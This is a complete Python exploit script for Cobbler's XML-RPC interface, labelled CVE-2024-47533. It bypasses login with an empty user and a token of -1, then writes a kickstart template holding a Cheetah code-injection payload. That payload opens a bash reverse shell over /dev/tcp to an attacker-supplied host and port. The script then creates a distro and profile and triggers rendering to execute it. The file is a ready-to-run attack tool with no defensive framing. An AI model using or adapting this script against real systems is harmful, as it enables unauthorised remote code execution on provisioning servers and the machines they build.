#!/usr/bin/env python3
"""
Cobbler XML-RPC RCE Exploit (CVE-2024-47533)
Description:
    Exploits unauthenticated template writing in Cobbler to achieve remote code execution.
"""
import xmlrpc.client
import uuid
import sys
import argparse

##
##
def build_payload(lhost: str, lport: str) -> str:
    """
    Generate a minimal kickstart file with embedded Cheetah RCE payload.
    """
    return f"""#set $null = __import__('os').system('bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"')
lang en_US
keyboard us
network --bootproto=dhcp
rootpw  --plaintext cobbler
timezone UTC
bootloader --location=mbr
clearpart --all --initlabel
autopart
reboot
"""


def exploit(target: str, lhost: str, lport: str) -> None:
    """
    Execute the Cobbler RCE exploit.
    """
    print(f"[+] Target: {target}")
    print(f"[+] Reverse shell to: {lhost}:{lport}")

    try:
        s = xmlrpc.client.ServerProxy(target)

        # Authenticate via CVE-2024-47533 bypass
        token = s.login("", -1)
        print(f"[+] Got token: {token}")

        # Write malicious template
        ks_name = "pwn.ks"
        payload = build_payload(lhost, lport)
        s.write_autoinstall_template(ks_name, payload, token)
        print(f"[+] Wrote malicious kickstart: {ks_name}")

        # Create unique distro/profile names
        suffix = str(uuid.uuid4())[:4]
        distro_name = f"pwn_distro{suffix}"
        profile_name = "pwnprof"

        # Create distro
        did = s.new_distro(token)
        s.modify_distro(did, "name", distro_name, token)
        s.modify_distro(did, "arch", "x86_64", token)
        s.modify_distro(did, "breed", "redhat", token)
        s.modify_distro(did, "kernel", "vmlinuz", token)
        s.modify_distro(did, "initrd", "initrd.img", token)
        s.save_distro(did, token)
        print(f"[+] Created distro: {distro_name}")

        # Create or get profile
        try:
            pid = s.new_profile(token)
            s.modify_profile(pid, "name", profile_name, token)
        except xmlrpc.client.Fault:
            pid = s.get_profile(profile_name, token)

        s.modify_profile(pid, "distro", distro_name, token)
        s.modify_profile(pid, "autoinstall", ks_name, token)
        s.modify_profile(pid, "kickstart", ks_name, token)
        s.save_profile(pid, token)
        print(f"[+] Created/linked profile: {profile_name}")

        # Trigger rendering (executes payload)
        print("[+] Triggering payload...")
        output = s.generate_profile_autoinstall(profile_name)
        print(output)

    except Exception as e:
        print(f"[!] Exploit failed: {e}")
        sys.exit(1)


def parse_args():
    """
    Parse command-line arguments.
    """
    parser = argparse.ArgumentParser(
        description="Cobbler XML-RPC RCE Exploit (CVE-2024-47533)"
    )
    parser.add_argument(
        "-t", "--target", required=True,
        help="Target URL (e.g. http://127.0.0.1:25151)"
    )
    parser.add_argument(
        "-l", "--lhost", required=True,
        help="Local host for reverse shell"
    )
    parser.add_argument(
        "-p", "--lport", required=True,
        help="Local port for reverse shell"
    )
    return parser.parse_args()


if __name__ == "__main__":
    args = parse_args()
    exploit(args.target, args.lhost, args.lport)
##
##
